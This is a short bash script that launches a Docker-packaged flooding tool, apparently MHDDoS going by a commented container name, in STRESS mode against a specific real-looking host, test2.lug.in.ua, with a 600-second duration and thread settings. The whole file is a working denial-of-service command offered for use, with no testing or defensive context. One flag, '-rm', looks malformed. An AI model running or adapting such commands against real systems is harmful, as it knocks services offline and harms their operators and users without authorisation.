#!/usr/bin/env bash

cd ..
#docker run --name mhddos -P dyman/battleship_cannon STRESS http://test2.lug.in.ua 0 2 0 10 600 true
docker run -rm -P dyman/battleship_cannon STRESS http://test2.lug.in.ua 0 2 0 10 600 true